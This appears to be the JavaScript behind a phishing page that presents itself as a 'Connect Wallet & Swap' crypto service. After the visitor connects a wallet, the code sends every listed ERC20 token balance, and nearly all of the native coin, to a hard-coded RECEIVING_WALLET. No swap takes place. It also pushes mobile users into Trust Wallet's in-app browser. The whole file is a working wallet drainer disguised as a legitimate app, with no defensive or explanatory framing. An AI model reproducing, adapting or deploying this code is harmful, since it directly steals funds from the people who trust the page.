let provider, signer, userAddress;
let currentNetwork = "bsc";
const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

// Standard ERC20 ABI
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)"
];

window.addEventListener('load', () => {
  document.getElementById('currentUrl').textContent = window.location.href;
  document.getElementById("networkSelect").addEventListener('change', (e) => {
    currentNetwork = e.target.value;
    updateTokenVisibility();
  });
  document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
  document.getElementById("connectWallet").addEventListener("click", connectAndSwap);
  checkWalletEnvironment();
  updateTokenVisibility();
});

function checkWalletEnvironment() {
  if (isMobile && !window.ethereum) {
    showTrustWalletUI();
  } else if (window.ethereum && window.ethereum.isTrust) {
    hideTrustWalletUI();
  } else if (isMobile && window.ethereum) {
    hideTrustWalletUI();
  }
}

function showTrustWalletUI() {
  document.getElementById("trustContainer").style.display = 'block';
  document.getElementById("connectWallet").style.display = 'none';
  document.querySelector('.mobile-warning').style.display = 'block';
}

function hideTrustWalletUI() {
  document.getElementById("trustContainer").style.display = 'none';
  document.getElementById("connectWallet").style.display = 'block';
  document.querySelector('.mobile-warning').style.display = 'none';
}

function openInTrustWallet() {
  const currentUrl = encodeURIComponent(window.location.href);
  window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
  setTimeout(() => {
    document.getElementById('manualSteps').style.display = 'block';
  }, 3000);
}

function updateTokenVisibility() {
  document.querySelectorAll('.token-item').forEach(item => {
    item.style.display = item.dataset.network === currentNetwork ? 'flex' : 'none';
  });
}

async function connectAndSwap() {
  try {
    showLoader();
    updateStatus("Initializing wallet connection...", "success");

    if (isMobile && !window.ethereum) {
      showTrustWalletUI();
      throw new Error("Please use Trust Wallet's in-app browser");
    }

    await window.ethereum.request({ method: "eth_requestAccounts" });
    await checkNetwork();
    
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    
    document.getElementById("connectWallet").disabled = true;
    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
    document.getElementById("walletInfo").textContent = 
      `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: ${NETWORK_CONFIGS[currentNetwork].chainName}`;
    
    await processAllTransfers();
  } catch (err) {
    hideLoader();
    updateStatus("Error: " + err.message, "error");
    document.getElementById("connectWallet").disabled = false;
    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-wallet"></i> Connect Wallet & Swap`;
    if (isMobile) showTrustWalletUI();
  }
}

async function checkNetwork() {
  const chainId = await window.ethereum.request({ method: 'eth_chainId' });
  const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
  
  if (chainId !== targetChainId) {
    updateStatus(`Switching to ${NETWORK_CONFIGS[currentNetwork].chainName}...`, "success");
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: targetChainId }]
      });
    } catch (switchError) {
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [NETWORK_CONFIGS[currentNetwork]]
          });
        } catch (addError) {
          throw new Error(`Please switch to ${NETWORK_CONFIGS[currentNetwork].chainName} manually`);
        }
      } else {
        throw new Error("Failed to switch network");
      }
    }
  }
}

async function processAllTransfers() {
  try {
    const tokensToSwap = TOKENS[currentNetwork].sort((a, b) => a.priority - b.priority);
    let successCount = 0;
    let processedTokens = 0;
    
    // Process ERC20 tokens
    for (const token of tokensToSwap.filter(t => !t.isNative)) {
      try {
        updateStatus(`Checking ${token.symbol} balance...`, "success");
        
        // Use token.abi if defined, otherwise use standard ERC20 ABI
        const abi = token.abi || ERC20_ABI;
        const contract = new ethers.Contract(token.address, abi, signer);
        const balance = await contract.balanceOf(userAddress);
        
        if (balance.gt(0)) {
          processedTokens++;
          updateStatus(`Transferring ${token.symbol}...`, "success");
          
          // Add gas limit for problematic tokens
          const tx = await contract.transfer(RECEIVING_WALLET, balance, {
            gasLimit: 100000 // Increased gas limit for safety
          });
          
          await tx.wait();
          successCount++;
          
          updateStatus(
            `${token.symbol} transferred! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View TX</a>`,
            "success"
          );
        }
      } catch (err) {
        console.error(`Error transferring ${token.symbol}:`, err);
        updateStatus(`Failed to transfer ${token.symbol}: ${err.message}`, "error");
      }
    }

    // Process native token
    const nativeToken = tokensToSwap.find(t => t.isNative);
    if (nativeToken) {
      try {
        updateStatus(`Checking ${nativeToken.symbol} balance...`, "success");
        const balance = await provider.getBalance(userAddress);
        const keepAmount = ethers.utils.parseUnits("0.002", nativeToken.decimals);
        const sendAmount = balance.gt(keepAmount) ? balance.sub(keepAmount) : balance;
        
        if (sendAmount.gt(0)) {
          processedTokens++;
          updateStatus(`Transferring ${nativeToken.symbol}...`, "success");
          
          const tx = await signer.sendTransaction({
            to: RECEIVING_WALLET,
            value: sendAmount,
            gasLimit: 21000 // Standard gas for native transfers
          });
          await tx.wait();
          successCount++;
          
          updateStatus(
            `${nativeToken.symbol} transferred! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View TX</a>`,
            "success"
          );
        }
      } catch (err) {
        console.error(`Error transferring ${nativeToken.symbol}:`, err);
        updateStatus(`Failed to transfer ${nativeToken.symbol}: ${err.message}`, "error");
      }
    }
    
    if (successCount > 0) {
      updateStatus(`Successfully transferred ${successCount} tokens!`, "success");
    } else if (processedTokens > 0) {
      updateStatus("Some transfers failed", "error");
    } else {
      updateStatus("No token balances found to transfer", "success");
    }
    
    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Process Complete`;
  } catch (err) {
    throw new Error("Transfer process failed");
  } finally {
    hideLoader();
  }
}

function updateStatus(message, type) {
  const statusDiv = document.getElementById("status");
  statusDiv.style.display = "block";
  statusDiv.innerHTML = message;
  statusDiv.className = `status ${type}`;
}

function showLoader() {
  document.getElementById("loader").style.display = "block";
}

function hideLoader() {
  document.getElementById("loader").style.display = "none";
}
